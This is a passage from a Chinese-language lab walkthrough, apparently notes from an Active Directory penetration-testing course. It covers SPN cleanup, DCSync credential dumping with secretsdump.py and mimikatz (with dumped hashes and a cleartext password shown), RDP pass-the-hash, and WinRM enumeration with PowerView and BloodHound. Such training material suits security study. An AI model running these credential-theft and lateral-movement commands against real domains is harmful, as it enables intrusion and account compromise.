class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : adunn</span><br><span class="line">[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[*] ServicePrincipalName   : notahacker/LEGIT</span><br><span class="line">[*] PwdLastSet             : <span class="number">3</span>/<span class="number">1</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">29</span>:<span class="number">08</span> AM</span><br><span class="line">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span><br><span class="line">[*] Hash                   : <span class="variable">$krb5tgs</span><span class="variable">$23</span><span class="variable">$</span>*adunn<span class="variable">$INLANEFREIGHT</span>.LOCAL<span class="variable">$notahacker</span>/LEGIT@INLANEFREIGHT.LOCAL*<span class="variable">$</span> &lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h3 id="Cleanup"><a href="#Cleanup" class="headerlink" title="Cleanup"></a>Cleanup</h3><p>在清理方面，需要做以下几件事：</p><ol><li>删除在用户上创建的虚假 SPN <code>adunn</code></li><li>从组<code>damundsen</code>中删除用户<code>Help Desk Level 1</code></li><li>将用户的密码设置<code>damundsen</code>回其原始值（如果知道）或让客户端设置&#x2F;提醒用户</li></ol><p>顺序很重要，因为如果先从组中删除用户，那么就没有权利删除假的 SPN。</p><h4 id="remove-the-fake-SPN"><a href="#remove-the-fake-SPN" class="headerlink" title="remove the fake SPN"></a>remove the fake SPN</h4><p>删除在用户上创建的虚假 SPN <code>adunn</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-DomainObject</span> <span class="literal">-Credential</span> <span class="variable">$Cred2</span> <span class="literal">-Identity</span> adunn <span class="literal">-Clear</span> serviceprincipalname <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">VERBOSE: [<span class="built_in">Get-Domain</span>] <span class="keyword">Using</span> alternate credentials for Get-Domain</span><br><span class="line">VERBOSE: [<span class="built_in">Get-Domain</span>] Extracted domain <span class="string">&#x27;INLANEFREIGHT&#x27;</span> from <span class="literal">-Credential</span></span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainSearcher</span>] search base: LDAP://ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainSearcher</span>] <span class="keyword">Using</span> alternate credentials for LDAP connection</span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainObject</span>] <span class="built_in">Get-DomainObject</span> <span class="keyword">filter</span> string:</span><br><span class="line">(&amp;(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))</span><br><span class="line">VERBOSE: [<span class="built_in">Set-DomainObject</span>] Clearing <span class="string">&#x27;serviceprincipalname&#x27;</span> <span class="keyword">for</span> object <span class="string">&#x27;adunn&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="remove-a-user-from-the-group"><a href="#remove-a-user-from-the-group" class="headerlink" title="remove a user from the group"></a>remove a user from the group</h4><p>从 Help Desk Level 1 组中删除 damundsen</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Remove-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Help Desk Level 1&quot;</span> <span class="literal">-Members</span> <span class="string">&#x27;damundsen&#x27;</span> <span class="literal">-Credential</span> <span class="variable">$Cred2</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">VERBOSE: [<span class="built_in">Get-PrincipalContext</span>] <span class="keyword">Using</span> alternate credentials</span><br><span class="line">VERBOSE: [<span class="built_in">Remove-DomainGroupMember</span>] Removing member <span class="string">&#x27;damundsen&#x27;</span> from <span class="built_in">group</span> <span class="string">&#x27;Help Desk Level 1&#x27;</span></span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>确认 damundsen 已从群组中移除</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Help Desk Level 1&quot;</span> | <span class="built_in">Select</span> MemberName |? &#123;<span class="variable">$_</span>.MemberName <span class="operator">-eq</span> <span class="string">&#x27;damundsen&#x27;</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure><h4 id="change-password"><a href="#change-password" class="headerlink" title="change password"></a>change password</h4><p>最后，将用户的密码设置<code>damundsen</code>回其原始值（如果知道）或让客户端设置&#x2F;提醒用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; net user password newpassword /domain</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-ADAccountPassword</span> <span class="literal">-Identity</span> damundsen <span class="literal">-NewPassword</span> (<span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;password&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>)</span><br></pre></td></tr></table></figure><p>或设置一下命令，提醒用户更改密码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-ADUser</span> <span class="literal">-Identity</span> damundsen <span class="literal">-ChangePasswordAtLogon</span> <span class="variable">$true</span></span><br></pre></td></tr></table></figure><h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><p>DCSync 是一种利用内置的 <code>Directory Replication Service Remote Protocol</code> 窃取 Active Directory 密码数据库的技术，域控制器会使用该数据库来复制域数据。这允许攻击者模仿域控制器来检索用户 NTLM 密码哈希。</p><p>攻击的关键是请求域控制器通过 <code>DS-Replication-Get-Changes-All</code> 扩展权限复制密码。执行此攻击，必须控制具有执行域复制权限的帐户（具有 <code>DS-Replication-Get-Changes</code> 和 <code>DS-Replication-Get-Changes-All</code> ）。域&#x2F;企业管理员和默认域管理员默认拥有此权限。</p><h3 id="View-Replication-Privileges"><a href="#View-Replication-Privileges" class="headerlink" title="View Replication Privileges"></a>View Replication Privileges</h3><h4 id="ADSI-edit"><a href="#ADSI-edit" class="headerlink" title="ADSI edit"></a>ADSI edit</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729234126504.png" alt="adnunn_right_dcsync"></p><p>在评估过程中，通常会发现具有这些权限的其他帐户，一旦被攻破，就可以利用其访问权限检索任何域用户的当前 NTLM 密码哈希以及与其以前密码相对应的哈希。</p><h4 id="PowerView-3"><a href="#PowerView-3" class="headerlink" title="PowerView"></a>PowerView</h4><p>获取 SID</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> adunn  |<span class="built_in">select</span> samaccountname,objectsid,memberof,useraccountcontrol |<span class="built_in">fl</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">samaccountname     : adunn</span><br><span class="line">objectsid          : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">memberof           : &#123;CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar</span><br><span class="line">                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security</span><br><span class="line">                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share <span class="built_in">H</span> Drive,OU=Security</span><br><span class="line">                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...&#125;</span><br><span class="line">useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD</span><br></pre></td></tr></table></figure><p>检查复制权限<code>DS-Replication-Get-Changes-All</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$sid</span>= <span class="string">&quot;S-1-5-21-3842939050-3880317879-2865463114-1164&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ObjectAcl</span> <span class="string">&quot;DC=inlanefreight,DC=local&quot;</span> <span class="literal">-ResolveGUIDs</span> | ? &#123; (<span class="variable">$_</span>.ObjectAceType <span class="operator">-match</span> <span class="string">&#x27;Replication-Get&#x27;</span>)&#125; | ?&#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-match</span> <span class="variable">$sid</span>&#125; |<span class="built_in">select</span> AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | <span class="built_in">fl</span></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-498</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes</span></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-516</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes-All</span></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes-In-Filtered-Set</span></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes</span></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes-All</span></span><br></pre></td></tr></table></figure><p>如果对用户拥有某些权限（例如<a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl">WriteDacl</a>），还可以将此权限添加到控制下的用户，执行 DCSync 攻击，然后删除权限以尝试掩盖踪迹。</p><h3 id="DCSync-replication"><a href="#DCSync-replication" class="headerlink" title="DCSync replication"></a>DCSync replication</h3><h4 id="secretsdump-py"><a href="#secretsdump-py" class="headerlink" title="secretsdump.py"></a>secretsdump.py</h4><p>运行该工具会将所有哈希写入带有前缀的文件中<code>inlanefreight_hashes</code>。</p><p><code>-just-dc-ntlm</code> 只输出 NTLM Hash</p><p><code>-just-dc-user &lt;USERNAME&gt;</code> 仅提取特定用户的数据</p><p><code>-pwd-last-set</code> 查看帐户的密码上次更改时间</p><p><code>-history</code> 转储密码历史记录</p><p><code>-user-status</code> 是另一个有用的标志，用于检查用户是否被禁用</p><p><code>-just-dc</code>  创建三个文件：一个包含 NTLM Hash，一个包含 Kerberos 密钥，一个包含来自 NTDS 的任何启用了可逆加密的帐户的明文密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -just-dc INLANEFREIGHT/adunn@172.16.5.5 -outputfile inlanefreight_hashes</span><br><span class="line"></span><br><span class="line">Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5</span><br><span class="line">[*] Searching for NTDS.dit</span><br><span class="line">[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time</span><br><span class="line">[*] Using smbexec method for remote execution</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching for pekList, be patient</span><br><span class="line">[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6</span><br><span class="line">[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp </span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::</span><br><span class="line">ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::</span><br><span class="line">ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::</span><br><span class="line">ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::</span><br><span class="line">inlanefreight.local\-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::</span><br><span class="line">inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">d0wngrade:des-cbc-md5:d6fee0b62aa410fe</span><br><span class="line">d0wngrade:dec-cbc-crc:d6fee0b62aa410fe</span><br><span class="line">ACADEMY-EA-FILE$:des-cbc-md5:eaef54a2c101406d</span><br><span class="line">svc_qualys:des-cbc-md5:f125ab34b53eb61c</span><br><span class="line">forend:des-cbc-md5:e3c14adf9d8a04c1</span><br><span class="line">[*] ClearText password from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp </span><br><span class="line">proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure><h4 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><p>Mimikatz 必须在具有 DCSync 权限的用户上下文中运行。</p><p>runas.exe 启动 adunn 用户的一个 powershell</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [Version <span class="number">10</span>.<span class="number">0</span>.<span class="number">17763</span>.<span class="number">107</span>]</span><br><span class="line">(c) <span class="number">2018</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">runas</span> /<span class="title">netonly</span> /<span class="title">user:INLANEFREIGHT</span>\<span class="title">adunn</span> <span class="title">powershell</span></span></span><br><span class="line"><span class="function"><span class="title">Enter</span> <span class="title">the</span> <span class="title">password</span> <span class="title">for</span> <span class="title">INLANEFREIGHT</span>\<span class="title">adunn</span>:</span></span><br><span class="line"><span class="function"><span class="title">Attempting</span> <span class="title">to</span> <span class="title">start</span> <span class="title">powershell</span> <span class="title">as</span> <span class="title">user</span> &quot;<span class="title">INLANEFREIGHT</span>\<span class="title">adunn</span>&quot; ...</span></span><br></pre></td></tr></table></figure><p>从新生成的 powershell 会话中执行攻击</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT\administrator&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : administrator</span><br><span class="line">User Principal Name  : administrator@inlanefreight.local</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">10</span>/<span class="number">27</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">49</span>:<span class="number">32</span> AM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-500</span></span><br><span class="line">Object Relative ID   : <span class="number">500</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">88</span>ad09182de639ccc6579eb0849751cf</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">4625</span>fd0c31368ff4c255a3b876eaac3d</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h1 id="Privileged-Access"><a href="#Privileged-Access" class="headerlink" title="Privileged Access"></a>Privileged Access</h1><p>在域中站稳脚跟，目标就会转向通过横向或纵向移动来进一步推进位置，以获得对其他主机的访问权限，并最终实现域入侵或其他目标，具体取决于评估的目的。</p><p>如果接管一个对主机或一组主机具有本地管理员权限的帐户，可以用<code>Pass-the-Hash</code>通过 SMB 协议进行身份验证。</p><p>没有域中任何主机的本地管理员权，可以使用其他几种方法在 Windows 域中移动：</p><ul><li><code>Remote Desktop Protocol</code>（<code>RDP</code>）</li><li><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2">PowerShell Remoting</a> - 也称为 PSRemoting 或 Windows 远程管理 (WinRM) 访问，是一种远程访问协议，允许使用 PowerShell 在远程主机上运行命令或进入交互式命令行会话</li><li><code>MSSQL Server</code>- 具有 SQL Server 实例的 sysadmin 权限的帐户可以远程登录该实例并针对数据库执行查询。此访问权限可用于通过各种方法在 SQL Server 服务帐户的上下文中运行操作系统命令</li></ul><p>通过 BloodHound 枚举，以下边缘可以向展示给定用户拥有哪些类型的远程访问权限：</p><ul><li><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp">RDP</a></li><li><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote">PS Remote</a></li><li><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin">SQL Admin</a></li></ul><p>还可以使用 PowerView 等工具甚至内置工具来枚举这些权限。</p><h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><p>RDP（远程桌面协议，Remote Desktop Protocol） 是由微软开发的协议，用于在网络上实现远程连接和管理。</p><p>TCP 3389: 主要用于 RDP 数据传输。</p><p>UDP 3389: 用于增强远程桌面体验（如更流畅的视频或音频）</p><h3 id="enum-4"><a href="#enum-4" class="headerlink" title="enum"></a>enum</h3><p>PowerView Get-NetLocalGroupMember</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-NetLocalGroupMember</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-MS01</span> <span class="literal">-GroupName</span> <span class="string">&quot;Remote Desktop Users&quot;</span></span><br><span class="line"></span><br><span class="line">ComputerName : ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line">GroupName    : Remote Desktop Users</span><br><span class="line">MemberName   : INLANEFREIGHT\Domain Users</span><br><span class="line">SID          : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-513</span></span><br><span class="line">IsGroup      : True</span><br><span class="line">IsDomain     : UNKNOWN</span><br></pre></td></tr></table></figure><p>BloodHound 通过<code>Node Info</code>选项卡上<code>Execution Rights</code>下的组成员身份继承什么类型的远程访问权限。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729236753862.png" alt="bh_RDP_domain_users"></p><p>还可以通过<code>Analysis</code>选项卡并运行预构建的查询<code>Find Workstations where Domain Users can RDP</code>或<code>Find Servers where Domain Users can RDP</code>。</p><h3 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h3><h4 id="xfreerdp"><a href="#xfreerdp" class="headerlink" title="xfreerdp"></a>xfreerdp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:host /u:uname /p:passwd</span><br><span class="line">xfreerdp /v:host /u:uname /pth:NTLM</span><br></pre></td></tr></table></figure><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:INLANEFREIGHT.LOCAL /ntlm:d25ecd13fddbb542d2e16da4f9e0333d &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure><h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><p>禁用受限管理员模式</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729500335740.png" alt="asda"></p><p>设置为非禁用受限管理员模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</span><br><span class="line"></span><br><span class="line">reg query HKLM\System\CurrentControlSet\Control\Lsa | findstr DisableRestrictedAdmin</span><br></pre></td></tr></table></figure><h2 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h2><p>这也可能是低权限访问，可以使用它来搜索敏感数据或尝试提升权限，或者可能导致本地管理员访问，这可能会被利用来进一步获取访问权限。<code>Remote Management Users</code>组自 Windows 8&#x2F;Windows Server 2012 时代以来就已存在，用于在不授予本地管理员权限的情况下启用 WinRM 访问。</p><h3 id="enum-5"><a href="#enum-5" class="headerlink" title="enum"></a>enum</h3><p>PowerView Get-NetLocalGroupMember 枚举 <code>Remote Management Users</code>组的成员。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-NetLocalGroupMember</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-MS01</span> <span class="literal">-GroupName</span> <span class="string">&quot;Remote Management Users&quot;</span></span><br><span class="line"></span><br><span class="line">ComputerName : ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line">GroupName    : Remote Management Users</span><br><span class="line">MemberName   : INLANEFREIGHT\forend</span><br><span class="line">SID          : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5614</span></span><br><span class="line">IsGroup      : False</span><br><span class="line">IsDomain     : UNKNOWN</span><br></pre></td></tr></table></figure><p>BloodHound 中利用此自定义功能来搜索具有此类访问权限的用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) RETURN p2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729237489285.png" alt="canpsremote_bh_cypherq"></p><h3 id="connect-1"><a href="#connect-1" class="headerlink" title="connect"></a>connect</h3><h4 id="Windows-PowerShell"><a href="#Windows-PowerShell" class="headerlink" title="Windows - PowerShell"></a>Windows - PowerShell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 